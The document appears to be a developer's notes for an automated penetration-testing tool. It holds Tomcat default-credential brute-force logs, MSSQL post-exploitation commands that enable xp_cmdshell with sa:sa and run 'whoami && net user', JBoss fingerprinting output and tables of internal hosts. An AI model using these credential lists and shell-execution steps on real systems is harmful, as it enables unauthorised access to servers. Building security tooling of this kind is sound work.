[10:57:27] Invalid Apache Tomcat default cred role:changethis at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred tomcat:s3cret at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred role:changethis at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred QCC:QLogic66 at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred tomcat:changethis at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred admin:None at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred tomcat:changethis at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred admin:tomcat at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred admin:j5Brn9 at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred root:root at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred admin:j5Brn9 at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred role1:role1 at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred role1:tomcat at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred role:changethis at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred role1:tomcat at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred tomcat:changethis at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred admin:j5Brn9 at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred role1:tomcat at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred j2deployer:j2deployer at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat default cred ADMIN:ADMIN at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat default cred tomcat:s3cret at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat default cred admin:None at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred admin:admin at http://10.250.87.209:8080/host-manager/html
[10:57:27] [+] Found Apache Tomcat default cred admin:tomcat at http://10.250.87.209:8080/manager/html
[10:57:27] [+] Found Apache Tomcat default cred : at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred j2deployer:j2deployer at http://10.250.87.209:8080/host-manager/html
[10:57:30] Invalid Apache Tomcat default cred root:root at http://10.250.87.209:8080/manager/html
[10:57:30] Invalid Apache Tomcat default cred admin:tomcat at http://10.250.87.209:8080/tomcat/manager/html
[10:57:30] Scanning Completed


[10:57:30] Found 1 default credentials

Name           Username    Password    Target                                  Evidence
-------------  ----------  ----------  --------------------------------------  ----------
Apache Tomcat  admin       tomcat      http://10.250.87.209:8080/manager/html


==> m = re.findall('\[\+\] Found (.*) default cred (\S*):(\S*) ', text)

- Mode fast => ne pas reafficher table des targets au debut de chaque target

- MSSQL - postexploit
/bin/bash -c 'python2.7 msdat.py all -s 10.244.214.126 -p 1433 -U sa -P sa -v <<< C'; 

- MSSQL postexploit add shell exec:
python2.7 msdat.py xpcmdshell -s 10.244.214.126 -p 1433 -U sa -P sa -v --enable-xpcmdshell
/bin/bash -c 'python2.7 msdat.py xpcmdshell -s 10.244.214.126 -p 1433 -U sa -P sa -v --shell <<< "whoami && net user"''

- IMPORTANT: encadrer par /bin/bash -c '...' pour toutes les cmds avec <<< any

- impacket install => add sudo pip2 install .
  + reinstall dans docker

- smb => smbexec: also add psexec.py / wmiexec.py


- 
[2018-11-15 03:48PM]  JBoss HTTP Headers (Unreliable) (version 4.2)
[2018-11-15 03:48PM]  JBoss RMI Interface (version Any)
[2018-11-15 03:48PM]  JBoss Status Page (version Any)
[2018-11-15 03:48PM] Fingerprinting completed.
[2018-11-15 03:48PM] Loading auxiliary for 'jboss'...
[2018-11-15 03:48PM] Finished at 2018-11-15 03:48PM

- example de confusion tomcat / jboss :

Server JBoss :
| >207 | 10.244.120.34  | 10.244.120.34  | 8080 | tcp   | http    | product: Apache Tomcat/Coyote JSP engine version: 1.1                 | http://10.244.120.34:8080 

[*] [SMART] Wappalyzer fingerprinting returns: ['java', 'jboss-application-server', 'apache-tomcat', 'java-servlet', 'jboss-web']
[+] [SMART] New detected option: server = tomcat
[+] [SMART] New detected option: language = java
[+] [SMART] Change option: server = tomcat -> jboss
[+] [SMART] Change option: server = jboss -> tomcat
[+] [SMART] Change option: server = tomcat -> jboss


- exemple detection plusieurs version JBoss:
2018-11-15 05:04PM] Making GET request to http://10.244.120.34:8080/status?full=true with arguments {'verify': False, 'timeout': 5.0}
[2018-11-15 05:04PM] Matched 5 fingerprints for service jboss
[2018-11-15 05:04PM]    JBoss Web Manager (version 5.1)
[2018-11-15 05:04PM]    JBoss EJB Invoker Servlet (version Any)
[2018-11-15 05:04PM]    JBoss HTTP Headers (Unreliable) (version 5.0)
[2018-11-15 05:04PM]    JBoss JMX Invoker Servlet (version Any)
[2018-11-15 05:04PM]    JBoss RMI Interface (version Any)
[2018-11-15 05:04PM] Fingerprinting completed.
[2018-11-15 05:04PM] Loading auxiliary for 'jboss'...
[2018-11-15 05:04PM] Finished at 2018-11-15 05:04PM

                                                                                                                                                                                                      


[*] [SMART] Running post-check method "clusterd_detect_server" ...
[*] [SMART] Detected option (no update): server = jboss


- Add start method in SmartModules that detect product from grabbed banner in service.banner
   and update OS if ostype 

    example:
    product: Microsoft IIS httpd version: 6.0 ostype: Windows 
    product: Apache httpd version: 2.2.4 extrainfo: (Unix) DAV/2
    product: Apache httpd version: 2.0.63 extrainfo: DAV/2 hostname
    product: Microsoft Windows 7 - 10 microsoft-ds extrainfo:        |                             |                      | 0      |       |
|      |                |      |       |         | workgroup: FRA hostname: F98W00189184 ostype: Windows 
product: Web-Server httpd version: 3.0 extrainfo: Ricoh Aficio   | http://10.250.236.149:80    |                      | 1      |       |
|      |                |      |       |         | printer web image monitor devicetype: printer
product: Oracle TNS listener version: 12.1.0.2.0 
product: Apache Tomcat/Coyote JSP engine version: 1.1 
product: IBM Tivoli Enterprise Portal extrainfo: Servlet 3.
product: Microsoft SQL Server 2012 version: 11.00.6020; SP3 
product: VMware Workstation SOAP API version: 14.0.0 
product: Jetty version: 8.1.3.v20120522
| 9604 | 10.102.235.134 | 1433  | tcp   | mssql   | product: Microsoft SQL Server 2014 version: 12.00.2000 ostype:    |     |         | 1      |       |
|      |                |       |       |         | Windows                                                           |     |         |        |       |
| 9605 | 10.5.4.85      | 1433  | tcp   | mssql   | product: Microsoft SQL Server 2012 version: 11.00.7001 ostype:    |     |         | 1      |       |
|      |                |       |       |         | Windows                                                           |     |         |        |       |
| 9606 | 10.2.25.53     | 1433  | tcp   | mssql   | product: Microsoft SQL Server 2012 version: 11.00.7462 ostype:    |     |         | 1      |       |
|      |                |       |       |         | Windows                                                           |     |         |        |       |
| 9607 | 10.2.152.50    | 56531 | tcp   | mssql   | product: Microsoft SQL Server 2008 R2 version: 10.50.1600; RTM    |     |         | 1      |       |
|      |                |       |       |         | ostype: Windows                                                   |     |         |        |       |
| 9608 | 10.62.8.1      | 50456 | tcp   | mssql   | product: Microsoft SQL Server 2008 R2 version: 10.50.2500; SP1    |     |         | 1      |       |
|      |                |       |       |         | ostype: Windows                                                   |     |         |        |       |
| 9609 | 10.2.208.38    | 1433  | tcp   | mssql   | product: Microsoft SQL Server 2005 version: 9.00.5000; SP4        |     |         | 1      |       |
|      |                |       |       |         | ostype: Windows                                                   |     |         |        |       |
| 9610 | 10.102.42.95   | 64778 | tcp   | mssql   | product: Microsoft SQL Server 2005 version: 9.00.1399; RTM        |     |         | 1      |       |
|      |                |       |       |         | ostype: Windows                                                   |     |         |        |       |
| 9611 | 10.102.235.165 | 57454 | tcp   | mssql   | product: Microsoft SQL Server 2014 version: 12.00.2000 ostype:    |     |         | 1      |       |
|      |                |       |       |         | Windows                                                           |     |         |        |       |
| 9612 | 10.2.25.140    | 55374 | tcp   | mssql   | product: Microsoft SQL Server 2008 R2 version: 10.50.1600; RTM    |     |         | 1      |       |
|      |                |       |       |         | ostype: Windows                                                   |     |         |        |       |
| 9613 | 10.2.209.186   | 1433  | tcp   | mssql   | product: Microsoft SQL Server 2008 R2 version: 10.50.2425 ostype: |     |         | 1      |       |
|      |                |       |       |         | Windows                                                           |     |         |        |       |
| 9614 | 10.2.28.41     | 1433  | tcp   | mssql   | product: Microsoft SQL Server 2012 version: 11.00.2100; RTM       |     |         | 1      |       |
|      |                |       |       |         | ostype: Windows                                                   |     |         |        |       |
| 9615 | 10.2.153.31    | 1433  | tcp   | mssql   | product: Microsoft SQL Server 2012 version: 11.00.7462 ostype:    |     |         | 1      |       |
|      |                |       |       |         | Windows                                                           |     |         |        |       |
| 9616 | 10.2.25.109    | 55256 | tcp   | mssql   | product: Microsoft SQL Server 2008 R2 version: 10.50.1600; RTM    |     |         | 1      |       |
|      |                |       |       |         | ostype: Windows                                                   |     |         |        |       |
| 9617 | 10.1.98.127    | 1433  | tcp   | mssql   | product: Microsoft SQL Server 2008 R2 version: 10.50.4000; SP2    |     |         | 1      |       |
|      |                |       |       |         | ostype: Windows                                                   |     |         |        |       |
+------+----------------+-------+-------+---------+-----------------------


Services to add
===============
* NFS
* MongoDB
* RPC
* DNS
* LDAP
